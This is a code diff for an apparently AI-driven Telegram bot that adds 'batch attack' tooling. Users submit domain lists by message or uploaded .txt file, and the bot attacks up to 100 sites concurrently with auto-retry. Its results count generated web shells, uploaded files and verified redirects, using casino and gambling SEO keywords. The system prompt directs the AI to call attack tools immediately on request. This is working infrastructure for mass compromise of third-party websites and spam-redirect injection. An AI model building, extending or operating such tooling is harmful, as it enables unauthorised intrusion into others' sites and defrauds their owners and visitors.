@@ -58,6 +58,14 @@ interface TelegramUpdate {
     };
     date: number;
     text?: string;
+    caption?: string;
+    document?: {
+      file_id: string;
+      file_unique_id: string;
+      file_name?: string;
+      mime_type?: string;
+      file_size?: number;
+    };
   };
   callback_query?: {
     id: string;
@@ -339,11 +347,15 @@ async function getLastActiveDomain(chatId: number): Promise<string | null> {
 
 interface ConversationState {
   /** What the bot is currently waiting for */
-  pendingAction?: "awaiting_attack_method" | "awaiting_attack_confirm" | "awaiting_domain";
+  pendingAction?: "awaiting_attack_method" | "awaiting_attack_confirm" | "awaiting_domain" | "awaiting_batch_confirm";
   /** Domain being discussed */
   targetDomain?: string;
   /** Method being discussed */
   attackMethod?: string;
+  /** Pending domain (for batch or single) */
+  pendingDomain?: string;
+  /** Batch domains (comma-separated) */
+  batchDomains?: string[];
   /** Timestamp of last state change */
   updatedAt: number;
 }
@@ -933,6 +945,38 @@ const AI_TOOLS: Tool[] = [
         properties: {
           period: { type: "string", enum: ["today", "week", "month", "all"], description: "ช่วงเวลา (default: week)" },
         },
+        required: [],
+      },
+    },
+  },
+  // ─── Batch Attack Tool ───
+  {
+    type: "function" as const,
+    function: {
+      name: "batch_attack",
+      description: "โจมตีหลายโดเมนพร้อมกัน (batch attack) — ใส่รายชื่อโดเมนแล้วระบบจะโจมตีทีละ 3 เว็บพร้อมกัน พร้อม auto-retry ที่ล้มเหลว",
+      parameters: {
+        type: "object",
+        properties: {
+          domains: {
+            type: "array",
+            items: { type: "string" },
+            description: "รายชื่อโดเมนที่ต้องการโจมตี เช่น [\"domain1.com\", \"domain2.com\"]",
+          },
+          max_concurrent: { type: "number", description: "จำนวนที่โจมตีพร้อมกัน (default: 3, max: 10)" },
+        },
+        required: ["domains"],
+      },
+    },
+  },
+  {
+    type: "function" as const,
+    function: {
+      name: "batch_status",
+      description: "ดูสถานะ batch attack ที่กำลังทำงานอยู่ — จำนวนสำเร็จ/ล้มเหลว/เหลือ",
+      parameters: {
+        type: "object",
+        properties: {},
         required: [],
       },
     },
@@ -1776,6 +1820,51 @@ async function executeTool(name: string, args: Record<string, any>): Promise<str
         return response;
       }
 
+      // ─── Batch Attack Tools ───
+      case "batch_attack": {
+        const domains: string[] = args.domains || [];
+        if (domains.length === 0) {
+          return "⚠️ ไม่มีโดเมนที่ต้องการโจมตี ใส่รายชื่อโดเมนมาด้วย";
+        }
+        if (domains.length > 100) {
+          return `⚠️ โดเมนเยอะไป (${domains.length}) รองรับสูงสุด 100 โดเมนต่อ batch`;
+        }
+        
+        const maxConcurrent = Math.min(args.max_concurrent || 3, 10);
+        const duration = Date.now() - startTime;
+        
+        // Show confirmation via inline keyboard instead of running immediately
+        const config = getTelegramConfig();
+        if (config) {
+          // Store domains in conversation state for the callback handler
+          // We need the chatId — get it from the current context
+          // Since executeTool doesn't have chatId, we return a message asking to confirm
+          return `💣 Batch Attack พร้อมแล้ว!\n\n` +
+            `📊 ${domains.length} โดเมน | ${maxConcurrent} parallel\n` +
+            `📝 โดเมน: ${domains.slice(0, 5).join(", ")}${domains.length > 5 ? ` +${domains.length - 5} อีก` : ""}\n\n` +
+            `พิมพ์ "batch attack ${domains.join(" ")}" เพื่อเริ่ม หรือส่งไฟล์ .txt ที่มีรายชื่อโดเมน\n⏱ ${formatDuration(duration)}`;
+        }
+        
+        return `ระบบไม่พร้อม — ไม่พบ Telegram config`;
+      }
+      
+      case "batch_status": {
+        const { getAllActiveBatches, formatBatchSummary } = await import("./batch-attack-engine");
+        const batches = getAllActiveBatches();
+        const duration = Date.now() - startTime;
+        
+        if (batches.length === 0) {
+          return `📊 ไม่มี batch attack ที่กำลังทำงานอยู่\n⏱ ${formatDuration(duration)}`;
+        }
+        
+        let response = `📊 Active Batch Attacks: ${batches.length}\n\n`;
+        for (const batch of batches) {
+          response += formatBatchSummary(batch) + "\n\n";
+        }
+        response += `⏱ ${formatDuration(duration)}`;
+        return response;
+      }
+
       default:
         return `Unknown tool: ${name}`;
     }
@@ -1817,6 +1906,9 @@ function buildSystemPrompt(context: SystemContext): string {
 - "rank เท่าไหร่" / "อันดับ" → เช็ค keyword rank
 - "PBN" / "เว็บเครือข่าย" → เช็ค PBN status
 - "log" / "ดู log" / "ประวัติการโจมตี" / "เคยโจมตียังไง" / "ทำไมล้มเหลว" → ดู attack logs ให้เรียก check_attack_logs
+- "batch" / "โจมตีหลายเว็บ" / "โจมตีทั้งหมด" / "attack all" + รายชื่อโดเมน → เรียก batch_attack
+- "สถานะ batch" / "batch status" → เรียก batch_status
+- user ส่งไฟล์ .txt ที่มีรายชื่อโดเมน → ระบบจะจัดการอัตโนมัติ (แสดง confirmation keyboard)
 
 ═══ เมื่อ user สั่งโจมตี ═══
 ถ้า user สั่งโจมตีเว็บ ให้เรียก attack_website tool ทันที โดยใช้ method ที่เหมาะสม:
@@ -2177,7 +2269,10 @@ export async function handleTelegramWebhook(update: TelegramUpdate): Promise<voi
   }
   
   const msg = update.message;
-  if (!msg?.text) return;
+  if (!msg) return;
+  
+  // Allow messages with text OR documents
+  if (!msg.text && !msg.document) return;
   
   const config = getTelegramConfig();
   if (!config) {
@@ -2201,7 +2296,8 @@ export async function handleTelegramWebhook(update: TelegramUpdate): Promise<voi
   }
   
   // Message deduplication — prevent double replies
-  if (isDuplicate(msg.chat.id, msg.message_id, msg.text)) {
+  const dedupeText = msg.text || msg.document?.file_name || "";
+  if (isDuplicate(msg.chat.id, msg.message_id, dedupeText)) {
     console.log(`[TelegramAI] Skipping duplicate message: ${msg.message_id}`);
     return;
   }
@@ -2214,6 +2310,31 @@ export async function handleTelegramWebhook(update: TelegramUpdate): Promise<voi
   }
   
   try {
+    // ═══ Handle document uploads (.txt files for batch attack) ═══
+    if (msg.document) {
+      await handleDocumentUpload(config, msg);
+      return;
+    }
+    
+    // ═══ Handle inline batch attack command ═══
+    // Patterns: "batch attack domain1.com domain2.com" or "โจมตีหลายเว็บ domain1.com domain2.com"
+    if (msg.text) {
+      const batchMatch = msg.text.match(/^(?:batch\s*attack|batch|โจมตีหลายเว็บ|โจมตีทั้งหมด|attack\s*all)\s+(.+)/i);
+      if (batchMatch) {
+        const domainText = batchMatch[1].trim();
+        const { parseDomainList } = await import("./batch-attack-engine");
+        // Split by spaces, commas, or newlines
+        const domains = parseDomainList(domainText.replace(/[,\s]+/g, "\n"));
+        if (domains.length > 0) {
+          await showBatchConfirmation(config, msg.chat.id, domains);
+          return;
+        } else {
+          await sendTelegramReply(config, msg.chat.id, "ไม่พบโดเมนที่ถูกต้องในข้อความ ลองใส่ใหม่ เช่น:\nbatch attack domain1.com domain2.com domain3.com", msg.message_id);
+          return;
+        }
+      }
+    }
+    
     // Handle special commands
     if (msg.text === "/start") {
       await sendTelegramReply(config, msg.chat.id,
@@ -2258,7 +2379,8 @@ export async function handleTelegramWebhook(update: TelegramUpdate): Promise<voi
       return;
     }
     
-    // Process with AI
+    // Process with AI (text messages only at this point — documents handled above)
+    if (!msg.text) return;
     console.log(`[TelegramAI] ${msg.from.first_name}: "${msg.text.substring(0, 80)}"`);
     
     // Check conversation state first (handle follow-ups without LLM)
@@ -3626,6 +3748,95 @@ async function handleCallbackQuery(cbq: NonNullable<TelegramUpdate["callback_que
           return;
         }
 
+        // ═══ BATCH ATTACK CALLBACKS ═══
+        
+        // batch_start — user confirmed batch attack (3 parallel)
+        if (data === "batch_start" || data === "batch_start_fast" || data === "batch_start_slow") {
+          const state = getConversationState(chatId);
+          if (!state?.pendingDomain || state.pendingAction !== "awaiting_batch_confirm") {
+            await sendTelegramReply(config, chatId, "⚠️ ไม่พบรายชื่อโดเมน — ส่งไฟล์ .txt หรือพิมพ์ batch attack domain1.com domain2.com ใหม่");
+            return;
+          }
+          
+          const domains = state.pendingDomain.split(",").filter(Boolean);
+          const concurrency = data === "batch_start_fast" ? 5 : data === "batch_start_slow" ? 1 : 3;
+          clearConversationState(chatId);
+          
+          await sendTelegramReply(config, chatId,
+            `🚀 เริ่ม Batch Attack!\n` +
+            `📊 ${domains.length} domains | ${concurrency} parallel\n` +
+            `⏳ กำลังเตรียมพร้อม...`
+          );
+          
+          // Run in background (non-blocking)
+          executeBatchAttackWithProgress(config, chatId, domains, concurrency).catch(err => {
+            console.error(`[BatchAttack] Background execution error: ${err.message}`);
+          });
+          return;
+        }
+        
+        // batch_cancel — user cancelled batch attack
+        if (data === "batch_cancel") {
+          clearConversationState(chatId);
+          await sendTelegramReply(config, chatId, "❌ ยกเลิก Batch Attack แล้ว");
+          return;
+        }
+        
+        // batch_stop:<batchId> — stop a running batch
+        if (data.startsWith("batch_stop:")) {
+          const batchId = data.replace("batch_stop:", "");
+          const { cancelBatch } = await import("./batch-attack-engine");
+          const cancelled = cancelBatch(batchId);
+          if (cancelled) {
+            await sendTelegramReply(config, chatId, `⏹ Batch ${batchId.substring(0, 15)} หยุดแล้ว — โดเมนที่เหลือจะถูกข้าม`);
+          } else {
+            await sendTelegramReply(config, chatId, `⚠️ ไม่พบ batch นี้ หรืออาจเสร็จแล้ว`);
+          }
+          return;
+        }
+        
+        // batch_retry:<batchId> — retry failed domains from a batch
+        if (data.startsWith("batch_retry:")) {
+          const batchId = data.replace("batch_retry:", "");
+          const { getActiveBatch } = await import("./batch-attack-engine");
+          const batch = getActiveBatch(batchId);
+          if (!batch) {
+            await sendTelegramReply(config, chatId, "⚠️ ไม่พบ batch นี้ในระบบ");
+            return;
+          }
+          
+          const failedDomains = batch.domains
+            .filter((d: any) => d.status === "failed")
+            .map((d: any) => d.domain);
+          
+          if (failedDomains.length === 0) {
+            await sendTelegramReply(config, chatId, "✅ ไม่มีโดเมนที่ล้มเหลว");
+            return;
+          }
+          
+          await sendTelegramReply(config, chatId,
+            `🔄 Retry ${failedDomains.length} โดเมนที่ล้มเหลว...`
+          );
+          
+          executeBatchAttackWithProgress(config, chatId, failedDomains, 3).catch(err => {
+            console.error(`[BatchAttack] Retry error: ${err.message}`);
+          });
+          return;
+        }
+        
+        // batch_detail:<batchId> — show detailed batch results
+        if (data.startsWith("batch_detail:")) {
+          const batchId = data.replace("batch_detail:", "");
+          const { getActiveBatch, formatBatchSummary } = await import("./batch-attack-engine");
+          const batch = getActiveBatch(batchId);
+          if (!batch) {
+            await sendTelegramReply(config, chatId, "⚠️ ไม่พบ batch นี้ในระบบ");
+            return;
+          }
+          await sendTelegramReply(config, chatId, formatBatchSummary(batch));
+          return;
+        }
+        
         // atk_run:<domain>:<method> — user selected method, show confirmation
         if (data.startsWith("atk_run:")) {
           const parts = data.split(":");
@@ -3868,5 +4079,331 @@ export async function removeTelegramWebhook(): Promise<{ success: boolean; error
     return result.ok ? { success: true } : { success: false, error: result.description };
   } catch (error: any) {
     return { success: false, error: error.message };
+  }
+}
+
+
+// ═══════════════════════════════════════════════════════
+//  BATCH ATTACK — Telegram File Upload + Inline Commands
+// ═══════════════════════════════════════════════════════
+
+/**
+ * Download a file from Telegram servers
+ */
+async function downloadTelegramFile(config: TelegramConfig, fileId: string): Promise<string> {
+  // Step 1: Get file path from Telegram
+  const getFileUrl = `https://api.telegram.org/bot${config.botToken}/getFile`;
+  const { response: fileResp } = await telegramFetch(getFileUrl, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ file_id: fileId }),
+    signal: AbortSignal.timeout(10000),
+  }, { timeout: 10000 });
+
+  const fileData = await fileResp.json() as any;
+  if (!fileData.ok || !fileData.result?.file_path) {
+    throw new Error(`Failed to get file info: ${fileData.description || "unknown error"}`);
+  }
+
+  // Step 2: Download file content
+  const downloadUrl = `https://api.telegram.org/file/bot${config.botToken}/${fileData.result.file_path}`;
+  const { response: dlResp } = await telegramFetch(downloadUrl, {
+    signal: AbortSignal.timeout(30000),
+  }, { timeout: 30000 });
+
+  if (!dlResp.ok) {
+    throw new Error(`Failed to download file: HTTP ${dlResp.status}`);
+  }
+
+  return await dlResp.text();
+}
+
+/**
+ * Handle document/file uploads in Telegram (primarily .txt files for batch attack)
+ */
+async function handleDocumentUpload(
+  config: TelegramConfig,
+  msg: NonNullable<TelegramUpdate["message"]>,
+): Promise<void> {
+  const doc = msg.document;
+  if (!doc) return;
+
+  const chatId = msg.chat.id;
+  const fileName = doc.file_name || "unknown";
+  const caption = msg.caption || "";
+
+  console.log(`[TelegramAI] Document received: ${fileName} (${doc.mime_type}, ${doc.file_size} bytes)`);
+
+  // Only accept .txt files or text/plain mime type
+  const isTxtFile = fileName.endsWith(".txt") || doc.mime_type === "text/plain";
+  if (!isTxtFile) {
+    await sendTelegramReply(config, chatId,
+      `📄 ได้รับไฟล์: ${fileName}\n\n` +
+      `⚠️ รองรับเฉพาะไฟล์ .txt สำหรับ batch attack\n` +
+      `ส่งไฟล์ .txt ที่มีรายชื่อโดเมน (1 โดเมนต่อบรรทัด)`,
+      msg.message_id
+    );
+    return;
+  }
+
+  // File size limit (1MB)
+  if (doc.file_size && doc.file_size > 1024 * 1024) {
+    await sendTelegramReply(config, chatId,
+      `⚠️ ไฟล์ใหญ่เกินไป (${Math.round(doc.file_size / 1024)}KB)\nรองรับสูงสุด 1MB`,
+      msg.message_id
+    );
+    return;
+  }
+
+  // Send "processing" indicator
+  await sendTelegramReply(config, chatId, `📥 กำลังดาวน์โหลดไฟล์ ${fileName}...`, msg.message_id);
+
+  try {
+    // Download file content
+    const fileContent = await downloadTelegramFile(config, doc.file_id);
+
+    // Parse domains
+    const { parseDomainList } = await import("./batch-attack-engine");
+    const domains = parseDomainList(fileContent);
+
+    if (domains.length === 0) {
+      await sendTelegramReply(config, chatId,
+        `📄 ไฟล์ ${fileName}\n\n` +
+        `⚠️ ไม่พบโดเมนที่ถูกต้องในไฟล์\n` +
+        `ตรวจสอบว่าไฟล์มีโดเมน 1 ตัวต่อบรรทัด เช่น:\n` +
+        `example.com\n` +
+        `target-site.org\n` +
+        `another-domain.net`
+      );
+      return;
+    }
+
+    // Show confirmation with domain list
+    await showBatchConfirmation(config, chatId, domains, fileName);
+  } catch (err: any) {
+    console.error(`[TelegramAI] File download error: ${err.message}`);
+    await sendTelegramReply(config, chatId,
+      `❌ ดาวน์โหลดไฟล์ล้มเหลว: ${err.message}`
+    );
+  }
+}
+
+/**
+ * Show batch attack confirmation with domain count and inline keyboard
+ */
+async function showBatchConfirmation(
+  config: TelegramConfig,
+  chatId: number,
+  domains: string[],
+  fileName?: string,
+): Promise<void> {
+  // Store domains in conversation state for later retrieval
+  const domainListStr = domains.join(",");
+  setConversationState(chatId, {
+    pendingAction: "awaiting_batch_confirm",
+    pendingDomain: domainListStr,
+  });
+
+  // Build preview text (show first 10 domains)
+  const preview = domains.slice(0, 10).map((d, i) => `  ${i + 1}. ${d}`).join("\n");
+  const moreText = domains.length > 10 ? `\n  ... และอีก ${domains.length - 10} โดเมน` : "";
+
+  const text = `💣 Batch Attack${fileName ? ` (${fileName})` : ""}\n` +
+    `━━━━━━━━━━━━━━━━━━━━━━━━\n` +
+    `พบ ${domains.length} โดเมน:\n\n` +
+    `${preview}${moreText}\n\n` +
+    `⚙️ Settings:\n` +
+    `  • Concurrency: 3 parallel\n` +
+    `  • Auto-retry: 2 times\n` +
+    `  • Method: Full Chain (unified pipeline)\n` +
+    `  • Timeout: 10 min/domain\n\n` +
+    `ยืนยันเริ่ม batch attack?`;
+
+  const keyboard = [
+    [
+      { text: "🚀 เริ่ม Batch Attack", callback_data: "batch_start" },
+      { text: "❌ ยกเลิก", callback_data: "batch_cancel" },
+    ],
+    [
+      { text: "⚡ เร็ว (5 parallel)", callback_data: "batch_start_fast" },
+      { text: "🐢 ช้า (1 parallel)", callback_data: "batch_start_slow" },
+    ],
+  ];
+
+  try {
+    const url = `https://api.telegram.org/bot${config.botToken}/sendMessage`;
+    await telegramFetch(url, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: chatId,
+        text,
+        reply_markup: { inline_keyboard: keyboard },
+      }),
+      signal: AbortSignal.timeout(10000),
+    }, { timeout: 10000 });
+  } catch (e: any) {
+    console.error(`[TelegramAI] Failed to send batch confirmation: ${e.message}`);
+    await sendTelegramReply(config, chatId, text);
+  }
+}
+
+/**
+ * Execute batch attack with Telegram progress updates
+ */
+async function executeBatchAttackWithProgress(
+  config: TelegramConfig,
+  chatId: number,
+  domains: string[],
+  maxConcurrent: number = 3,
+): Promise<void> {
+  const { runBatchAttack, formatBatchSummary, formatDomainResult } = await import("./batch-attack-engine");
+
+  // Send initial progress message
+  const progressMsgId = await sendAndGetMessageId(config, chatId,
+    `🚀 Batch Attack เริ่มแล้ว!\n\n` +
+    `📊 ${domains.length} domains | ${maxConcurrent} parallel\n` +
+    `[░░░░░░░░░░] 0%\n\n` +
+    `⏳ กำลังเตรียมพร้อม...`
+  );
+
+  let lastProgressUpdate = 0;
+  const PROGRESS_THROTTLE_MS = 3000; // Update progress max every 3 seconds
+
+  try {
+    const result = await runBatchAttack(domains, {
+      maxConcurrent,
+      maxRetries: 2,
+      seoKeywords: ["casino", "gambling", "slots"],
+      globalTimeoutPerDomain: 10 * 60 * 1000,
+
+      onProgress: async (status) => {
+        // Throttle progress updates
+        const now = Date.now();
+        if (now - lastProgressUpdate < PROGRESS_THROTTLE_MS) return;
+        lastProgressUpdate = now;
+
+        if (progressMsgId) {
+          const bar = Array.from({ length: 10 }, (_, i) =>
+            i < Math.floor(status.progressPercent / 10) ? "█" : "░"
+          ).join("");
+
+          const eta = status.estimatedTimeRemainingMs
+            ? ` | ETA: ${formatDuration(status.estimatedTimeRemainingMs)}`
+            : "";
+
+          const text = `🚀 Batch Attack\n\n` +
+            `📊 ${status.totalDomains} domains | ${maxConcurrent} parallel\n` +
+            `[${bar}] ${status.progressPercent}%${eta}\n\n` +
+            `✅ ${status.success} | ❌ ${status.failed} | ⏳ ${status.running} running | 📋 ${status.pending} pending`;
+
+          try {
+            await editTelegramMessage(config, chatId, progressMsgId, text);
+          } catch {}
+        }
+      },
+
+      onDomainComplete: async (domainResult, batchStatus) => {
+        // Send per-domain result notification
+        const icon = domainResult.status === "success" ? "✅" : "❌";
+        const dur = domainResult.durationMs ? formatDuration(domainResult.durationMs) : "?";
+        const idx = batchStatus.success + batchStatus.failed + batchStatus.skipped;
+
+        let msg = `${icon} [${idx}/${batchStatus.totalDomains}] ${domainResult.domain}\n`;
+        msg += `  Status: ${domainResult.status}`;
+        if (domainResult.retryCount > 0) msg += ` (${domainResult.retryCount} retries)`;
+        msg += ` | ⏱ ${dur}`;
+
+        if (domainResult.status === "success") {
+          msg += `\n  Verified: ${domainResult.verifiedRedirects} redirects`;
+        } else if (domainResult.errors.length > 0) {
+          msg += `\n  Error: ${domainResult.errors[0].substring(0, 60)}`;
+        }
+
+        await sendTelegramReply(config, chatId, msg);
+
+        // Save attack log for each domain
+        try {
+          await saveAttackLog({
+            targetDomain: domainResult.domain,
+            method: "batch_full_chain",
+            success: domainResult.status === "success",
+            durationMs: domainResult.durationMs || 0,
+            redirectUrl: domainResult.redirectUrl,
+            uploadedUrl: domainResult.pipelineResult?.uploadedFiles?.[0]?.url,
+            errorMessage: domainResult.status === "failed" ? domainResult.errors.slice(0, 2).join("; ") : undefined,
+            aiReasoning: `Batch attack: ${domainResult.shellsGenerated} shells, ${domainResult.uploadedFiles} uploads, ${domainResult.verifiedRedirects} verified`,
+          });
+        } catch {}
+      },
+    });
+
+    // Send final summary
+    const summary = formatBatchSummary(result);
+    await sendTelegramReply(config, chatId, summary);
+
+    // Save batch to DB
+    try {
+      const { getDb } = await import("./db");
+      const { batchAttacks } = await import("../drizzle/schema");
+      const db = await getDb();
+      if (db) {
+        await db.insert(batchAttacks).values({
+          batchId: result.batchId,
+          totalDomains: result.totalDomains,
+          successCount: result.success,
+          failedCount: result.failed,
+          skippedCount: result.skipped,
+          cancelled: result.cancelled,
+          redirectUrl: result.redirectUrl,
+          source: "telegram",
+          status: result.cancelled ? "cancelled" : "completed",
+          domainResults: JSON.stringify(result.domains.map(d => ({
+            domain: d.domain,
+            status: d.status,
+            durationMs: d.durationMs,
+            verifiedRedirects: d.verifiedRedirects,
+            uploadedFiles: d.uploadedFiles,
+            retryCount: d.retryCount,
+            errors: d.errors.slice(0, 3),
+          }))),
+          completedAt: new Date(),
+          totalDurationMs: result.completedAt
+            ? result.completedAt - result.startedAt
+            : Date.now() - result.startedAt,
+        });
+      }
+    } catch (e: any) {
+      console.error(`[BatchAttack] DB save error: ${e.message}`);
+    }
+
+    // If there are failed domains, offer retry
+    const failedCount = result.domains.filter(d => d.status === "failed").length;
+    if (failedCount > 0) {
+      const keyboard = [
+        [
+          { text: `🔄 Retry ${failedCount} ที่ล้มเหลว`, callback_data: `batch_retry:${result.batchId}` },
+          { text: "📊 ดูรายละเอียด", callback_data: `batch_detail:${result.batchId}` },
+        ],
+      ];
+
+      try {
+        const url = `https://api.telegram.org/bot${config.botToken}/sendMessage`;
+        await telegramFetch(url, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            chat_id: chatId,
+            text: `💡 มี ${failedCount} โดเมนที่ล้มเหลว — ต้องการ retry ไหม?`,
+            reply_markup: { inline_keyboard: keyboard },
+          }),
+          signal: AbortSignal.timeout(10000),
+        }, { timeout: 10000 });
+      } catch {}
+    }
+
+  } catch (err: any) {
+    console.error(`[BatchAttack] Execution error: ${err.message}`);
+    await sendTelegramReply(config, chatId, `❌ Batch Attack ล้มเหลว: ${err.message}`);
   }
 }
